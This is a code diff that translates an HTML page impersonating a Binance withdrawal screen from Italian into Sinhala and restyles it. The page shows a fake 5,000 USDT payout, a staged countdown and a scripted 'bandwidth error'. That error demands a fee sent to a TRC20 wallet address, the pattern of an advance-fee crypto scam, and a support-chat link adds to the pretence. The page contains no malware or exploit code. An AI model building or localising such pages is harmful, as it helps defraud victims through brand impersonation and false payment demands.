@@ -1,55 +1,97 @@
 <!DOCTYPE html>
-<html lang="it">
+<html lang="si">
 <head>
-  <meta charset="UTF-8">
-  <title>Recupero Prelievo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <title>මුදල් ඉවත් කිරීම - වෘත්තීය ආදර්ශය</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
+    :root{
+      --bg:#0b0f1a;
+      --accent:#f3ba2f;
+      --card:#0b0f1a;
+      --panel:#1a1f2b;
+      --muted:#ccc;
+      --white:#ffffff;
+    }
+    *{box-sizing:border-box}
     body {
       margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background-color: #0b0f1a;
-      color: white;
+      font-family: "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      background-color: var(--bg);
+      color: var(--white);
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
       position: relative;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
     }
     .app {
-      background-color: #0b0f1a;
+      background-color: var(--card);
       width: 100%;
-      max-width: 400px;
-      padding: 30px;
-      box-sizing: border-box;
-      border-radius: 20px;
-      box-shadow: 0 0 20px rgba(255,255,255,0.05);
+      max-width: 420px;
+      padding: 28px;
+      border-radius: 14px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.6), 0 0 40px rgba(243,186,47,0.03);
+    }
+    .header {
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:12px;
+      margin-bottom:18px;
     }
     .logo {
-      text-align: center;
-      font-size: 1.8em;
-      font-weight: bold;
-      margin-bottom: 20px;
-      color: #f3ba2f;
+      font-size:1.4rem;
+      font-weight:700;
+      color:var(--accent);
+      letter-spacing:1px;
+    }
+    .meta {
+      text-align:right;
+      font-size:0.95rem;
+      color:var(--muted);
     }
     .amount {
-      text-align: center;
-      font-size: 2em;
-      margin-bottom: 10px;
+      text-align:center;
+      font-size:1.9rem;
+      font-weight:700;
+      margin: 6px 0 4px;
     }
     .network {
-      text-align: center;
-      font-size: 0.95em;
-      margin-bottom: 30px;
-      color: #ccc;
+      text-align:center;
+      font-size:0.95rem;
+      color:var(--muted);
+      margin-bottom:18px;
     }
+
+    .card {
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      border-radius:12px;
+      padding:14px;
+      margin-bottom:20px;
+      border: 1px solid rgba(255,255,255,0.03);
+    }
+    .label {
+      font-weight:700;
+      color:var(--accent);
+      font-size:0.85rem;
+      margin-bottom:6px;
+    }
+    .value {
+      color:var(--white);
+      font-size:0.98rem;
+      word-break:break-word;
+    }
+
     .slider-container {
       background-color: #ffffff;
       border-radius: 50px;
       position: relative;
-      height: 50px;
+      height: 56px;
       width: 100%;
-      margin-bottom: 30px;
+      margin-bottom: 20px;
       overflow: hidden;
       touch-action: pan-y;
     }
@@ -63,18 +105,18 @@
       align-items: center;
       justify-content: center;
       color: #0b0f1a;
-      font-weight: bold;
+      font-weight:700;
       z-index: 1;
       user-select: none;
       pointer-events: none;
     }
     .slider-thumb {
       position: absolute;
-      top: 4px;
-      left: 4px;
-      height: calc(100% - 8px);
-      width: 50px;
-      background-color: #f3ba2f;
+      top: 6px;
+      left: 6px;
+      height: calc(100% - 12px);
+      width: 56px;
+      background-color: var(--accent);
       border-radius: 50px;
       cursor: pointer;
       z-index: 2;
@@ -84,113 +126,136 @@
       transition: left 300ms ease;
       user-select: none;
       touch-action: none;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.25);
-      font-weight: bold;
+      box-shadow: 0 6px 18px rgba(0,0,0,0.45), 0 2px 6px rgba(0,0,0,0.2);
+      font-weight:700;
+      color:#0b0f1a;
     }
-    .section {
-      display: none;
-      margin-bottom: 20px;
-    }
-    .label {
-      font-weight: bold;
-      margin-bottom: 5px;
-      color: #f3ba2f;
-    }
-    .value {
-      margin-bottom: 15px;
-      word-break: break-word;
-      font-size: 1em;
-      color: white;
-    }
+
+    .section { display:none; margin-bottom:16px; }
+    .section.active { display:block; }
+
     .button {
-      background-color: #f3ba2f;
+      background-color: var(--accent);
       color: #0b0f1a;
-      padding: 14px;
+      padding: 12px 14px;
       border: none;
-      border-radius: 6px;
+      border-radius: 8px;
       width: 100%;
-      font-size: 1em;
-      font-weight: bold;
+      font-size: 1rem;
+      font-weight: 700;
       cursor: pointer;
-      margin-top: 10px;
+      margin-top: 12px;
     }
-    .button:disabled {
-      background-color: #cccccc;
-      color: #666666;
-      cursor: not-allowed;
-    }
+    .button:disabled { background:#cccccc; color:#666666; cursor:not-allowed; }
+
     .error {
-      color: #ffcccb;
-      font-weight: bold;
-      margin-top: 20px;
-      text-align: center;
+      color: #ffd6d6;
+      font-weight:700;
+      margin-top:12px;
+      text-align:center;
     }
     .address-box {
-      background-color: #1a1f2b;
-      padding: 10px;
-      border-radius: 6px;
-      text-align: center;
-      font-size: 0.9em;
-      margin-top: 10px;
-      word-break: break-word;
-      color: #fff;
+      background-color: var(--panel);
+      padding:10px;
+      border-radius:8px;
+      text-align:center;
+      font-size:0.95rem;
+      margin-top:10px;
+      word-break:break-word;
+      color:var(--white);
+      border:1px solid rgba(255,255,255,0.03);
     }
     .support-button {
       position: fixed;
-      top: 20px;
-      right: 20px;
-      background-color: #f3ba2f;
+      top: 18px;
+      right: 18px;
+      background-color: var(--accent);
       color: #0b0f1a;
       padding: 10px 14px;
-      border-radius: 6px;
-      font-weight: bold;
+      border-radius: 8px;
+      font-weight:700;
       text-decoration: none;
-      box-shadow: 0 0 10px rgba(255,255,255,0.1);
+      box-shadow: 0 6px 24px rgba(243,186,47,0.08);
       z-index: 999;
     }
+
+    /* small helpers */
+    h3 { margin:8px 0 10px; font-size:1.05rem; }
+    p { margin:8px 0; color:var(--white); opacity:0.95; }
+    .muted { color:var(--muted); font-size:0.9rem; }
   </style>
 </head>
 <body>
-  <a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" class="support-button">Contatta Supporto</a>
+  <a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" class="support-button">ආධාරය සම්බන්ධ කරන්න</a>
 
-  <div class="app">
-    <div class="logo">BINANCE</div>
-    <div class="amount">7.000 USDT</div>
-    <div class="network">Rete: TRC20</div>
+  <div class="app" role="main" aria-labelledby="pageTitle">
+    <div class="header">
+      <div class="logo" id="pageTitle">BINANCE</div>
+      <div class="meta">
+        <div style="font-weight:700">ප්‍රවර්ගය: වෘත්තීය</div>
+        <div class="muted">ආරක්ෂිත ගනුදෙනු</div>
+      </div>
+    </div>
+
+    <div class="amount">5,000 USDT</div>
+    <div class="network">ජාලය: TRC20</div>
+
+    <div class="card">
+      <div class="label">කෙටි විස්තර</div>
+      <div class="value">ඔබ ඉදිරිපත් කරන ඉල්ලීම වෘත්තීය ක්‍රමවේදයෙන් සැකසේ. කරුණාකර ඔබගේ ගනුදෙනු තහවුරු කරන්න.</div>
+    </div>
 
     <!-- Slide to confirm -->
-    <div class="slider-container" id="slider" aria-label="Scorri per confermare" role="group">
-      <div class="slider-track" id="sliderTrack">Scorri per confermare</div>
-      <div class="slider-thumb" id="thumb" role="button" tabindex="0" aria-pressed="false" aria-label="Pulsante scorri per confermare">→</div>
+    <div class="slider-container" id="slider" aria-label="තහවුරු කිරීමට ස්ලයිඩ් කරන්න" role="group">
+      <div class="slider-track" id="sliderTrack">තහවුරු කිරීමට ස්ලයිඩ් කරන්න</div>
+      <div class="slider-thumb" id="thumb" role="button" tabindex="0" aria-pressed="false" aria-label="තහවුරු කිරීමට ස්ලයිඩ් කරන්න">→</div>
     </div>
 
     <!-- Preview -->
     <div class="section" id="preview">
-      <h3>Anteprima Transazione</h3>
-      <div class="label">Indirizzo Ricevente</div>
-      <div class="value">TSchVxCkHRxS23PZMTsp38R9tjfPBmnxj2</div>
-      <button class="button" onclick="startProcessing()">ELABORA PRELIEVO</button>
+      <h3>ගනුදෙනු පෙරදසුන</h3>
+
+      <div class="label">ලැබෙන ලිපිනය</div>
+      <div class="value">TST7i6KrAaRCpH1p7a7Evd42FZq3QjtM7d</div>
+
+      <div style="display:flex;gap:12px;margin-top:8px;">
+        <div style="flex:1">
+          <div class="label">මුළු මුදල</div>
+          <div class="value">5,000 USDT</div>
+        </div>
+        <div style="flex:1">
+          <div class="label">ගාස්තුව</div>
+          <div class="value">21 USDT</div>
+        </div>
+      </div>
+
+      <button class="button" onclick="startProcessing()">ඉවත් කිරීම ක්‍රියාත්මක කරන්න</button>
     </div>
 
     <!-- Processing -->
     <div class="section" id="processing">
-      <p>Attendere mentre il pagamento viene accreditato sul tuo account...</p>
-      <p id="timer">Caricamento: 0:40</p>
+      <h3>සියලුම මට්ටමින් සකස් කිරීම</h3>
+      <p>කරුණාකර ඉවසන්න. ඔබගේ ගෙවීම ආරක්ෂිතව ගිණුමට ඇතුළත් වේ. පහත ඉතිරි කාලය ප්‍රතිලාභය සඳහා වන බලාපොරොත්තුවයි.</p>
+      <p id="timer" class="muted">ශේෂිත කාලය: 0:40</p>
     </div>
 
     <!-- Received -->
     <div class="section" id="received">
-      <button class="button" id="receivedBtn" disabled>HO RICEVUTO</button>
+      <h3>ගෙවීම් තත්ත්වය</h3>
+      <p class="muted">ඔබගේ ගෙවීම ලැබුණු බවට තහවුරු කිරීමට පහත බොත්තම භාවිතා කරන්න.</p>
+      <button class="button" id="receivedBtn" disabled>මට ලැබී ඇත</button>
     </div>
 
     <!-- Error -->
     <div class="section" id="error">
-      <div class="error">⚠️ ERRORE DI PRELIEVO: LARGHEZZA DI BANDA INSUFFICIENTE</div>
-      <p class="value">Sono necessari 180 USDT per larghezza di banda e codice di allocazione prelievo</p>
-      <p class="value">Il prelievo sarà ricevuto in 10 secondi dopo l'autorizzazione.</p>
-      <div class="label">Indirizzo per il pagamento</div>
+      <div class="error">⚠️ ඉවත් කිරීමේ දෝෂය: ප්‍රමාණවත් බැන්ඩ්විත් නොමැත</div>
+      <p class="value">බැන්ඩ්විත් හා ඉවත් කිරීම සඳහා අවශ්‍ය ගාස්තු: 21 USDT.</p>
+      <p class="value">අවස�ර ලබා දුන් පසු, ඔබගේ නිකුත් කිරීම 10 තත්පරකින් ලැබේ.</p>
+
+      <div class="label">ගෙවීම් සඳහා ලිපිනය</div>
       <div class="address-box">TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o</div>
-      <button class="button">PAGA ORA</button>
+
+      <button class="button">දැන් ගෙවන්න</button>
     </div>
   </div>
 
@@ -204,26 +269,24 @@
     let startPointerX = 0;
     let thumbStartLeft = 0;
 
-    // Utilities
-    function clamp(val, min, max) { return Math.max(min, Math.min(max, val)); }
+    function clamp(val, min, max){ return Math.max(min, Math.min(max, val)); }
 
-    function getBounds() {
+    function getBounds(){
       const rect = slider.getBoundingClientRect();
       const thumbRect = thumb.getBoundingClientRect();
-      const minLeft = 4; // leave small padding from left
-      const maxLeft = rect.width - thumbRect.width - 4; // padding from right
+      const minLeft = 6;
+      const maxLeft = rect.width - thumbRect.width - 6;
       return { rect, thumbRect, minLeft, maxLeft };
     }
 
-    function setThumbLeft(x, animate = false) {
+    function setThumbLeft(x, animate = false){
       if (animate) thumb.style.transition = 'left 300ms ease';
       else thumb.style.transition = 'none';
       thumb.style.left = x + 'px';
     }
 
-    function animateThumbTo(x, cb) {
+    function animateThumbTo(x, cb){
       setThumbLeft(x, true);
-      // call callback after transition
       const onEnd = () => {
         thumb.removeEventListener('transitionend', onEnd);
         if (cb) cb();
@@ -231,21 +294,20 @@
       thumb.addEventListener('transitionend', onEnd);
     }
 
-    function confirmSlide() {
+    function confirmSlide(){
       if (confirmed) return;
       confirmed = true;
       thumb.setAttribute('aria-pressed', 'true');
-      // hide slider and show preview
       slider.style.display = 'none';
-      document.getElementById('preview').style.display = 'block';
+      document.getElementById('preview').classList.add('active');
     }
 
-    function resetThumb() {
+    function resetThumb(){
       const { minLeft } = getBounds();
       animateThumbTo(minLeft);
     }
 
-    // Pointer events for drag
+    // Pointer events to handle drag for mouse/touch/stylus
     thumb.addEventListener('pointerdown', (e) => {
       if (confirmed) return;
       dragging = true;
@@ -257,16 +319,14 @@
 
     document.addEventListener('pointermove', (e) => {
       if (!dragging || confirmed) return;
-      const { rect, minLeft, maxLeft } = getBounds();
+      const { minLeft, maxLeft } = getBounds();
       const clientX = e.clientX;
       let delta = clientX - startPointerX;
       let newLeft = clamp(thumbStartLeft + delta, minLeft, maxLeft);
       setThumbLeft(newLeft, false);
 
-      // If dragged fast to the end, we can auto-confirm early
       if (newLeft >= maxLeft - 6) {
         dragging = false;
-        // animate fully to end then confirm
         animateThumbTo(maxLeft, () => confirmSlide());
       }
     });
@@ -276,21 +336,17 @@
       dragging = false;
       const { minLeft, maxLeft } = getBounds();
       const left = parseFloat(thumb.style.left) || minLeft;
-      const threshold = maxLeft * 0.66; // 66% to confirm
+      const threshold = maxLeft * 0.66; // 66% confirmation threshold
       if (left >= threshold) {
-        // animate to end and confirm
         animateThumbTo(maxLeft, () => confirmSlide());
       } else {
-        // snap back
         resetThumb();
       }
     });
 
-    // Click / tap on track to instantly confirm (if not dragging)
+    // Tap on track to quickly confirm
     track.addEventListener('pointerdown', (e) => {
       if (confirmed) return;
-      // If user tapped the track (not the thumb), animate and confirm.
-      // Small protection: if pointerdown target is thumb, ignore (thumb will handle).
       if (e.target === thumb) return;
       const { maxLeft } = getBounds();
       animateThumbTo(maxLeft, () => confirmSlide());
@@ -309,48 +365,43 @@
         left = clamp(left - step, minLeft, maxLeft);
         setThumbLeft(left, true);
       } else if (e.key === 'Enter' || e.key === ' ') {
-        // space or enter confirms immediately
         animateThumbTo(maxLeft, () => confirmSlide());
       }
 
-      // If moved to the end by keyboard
       if (left >= maxLeft - 6) {
         animateThumbTo(maxLeft, () => confirmSlide());
       }
     });
 
-    // Initialize thumb position on load & on resize
-    function initThumb() {
+    // Initialize position
+    function initThumb(){
       const { minLeft } = getBounds();
       setThumbLeft(minLeft, false);
     }
-    window.addEventListener('resize', () => {
-      // reposition thumb appropriately on resize
-      if (!confirmed) initThumb();
-    });
+    window.addEventListener('resize', () => { if (!confirmed) initThumb(); });
     initThumb();
 
-    // Existing functions below (preview -> processing -> received -> error)
-    function startProcessing() {
-      document.getElementById('preview').style.display = 'none';
-      document.getElementById('processing').style.display = 'block';
+    // Flow: preview -> processing -> received -> error
+    function startProcessing(){
+      document.getElementById('preview').classList.remove('active');
+      document.getElementById('processing').classList.add('active');
 
       let time = 40;
       const timerEl = document.getElementById('timer');
       const interval = setInterval(() => {
         let seconds = time;
-        timerEl.textContent = `Caricamento: 0:${seconds < 10 ? '0' : ''}${seconds}`;
+        timerEl.textContent = `ශේෂිත කාලය: 0:${seconds < 10 ? '0' : ''}${seconds}`;
         time--;
         if (time < 0) {
           clearInterval(interval);
-          document.getElementById('processing').style.display = 'none';
-          document.getElementById('received').style.display = 'block';
+          document.getElementById('processing').classList.remove('active');
+          document.getElementById('received').classList.add('active');
           enableReceivedButton();
         }
       }, 1000);
     }
 
-    function enableReceivedButton() {
+    function enableReceivedButton(){
       let countdown = 10;
       const btn = document.getElementById('receivedBtn');
       const interval = setInterval(() => {
@@ -363,9 +414,9 @@
       }, 1000);
     }
 
-    function showError() {
-      document.getElementById('received').style.display = 'none';
-      document.getElementById('error').style.display = 'block';
+    function showError(){
+      document.getElementById('received').classList.remove('active');
+      document.getElementById('error').classList.add('active');
     }
   </script>
 </body>
